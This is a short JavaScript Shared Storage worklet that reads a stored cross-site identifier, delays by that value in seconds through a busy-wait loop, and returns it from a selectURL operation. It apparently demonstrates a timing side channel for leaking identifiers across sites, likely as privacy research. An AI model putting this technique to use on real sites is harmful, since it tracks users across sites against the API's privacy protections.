function sleep(milliseconds) {
    const date = Date.now();
    let currentDate = null;
    do {
        currentDate = Date.now();
    } while (currentDate - date < milliseconds);
}

class SelectURLOperation {
	async run(urls, data) {
		const identifier = await sharedStorage.get(`identifier-${data.index}`);

		console.log(`urls = ${JSON.stringify(urls)}`);
		console.log(`identifier = ${identifier}`);
		console.log(data.index)
		sleep(parseInt(identifier) * 1000);
		return parseInt(identifier);
	}
}

register('identifier', SelectURLOperation);
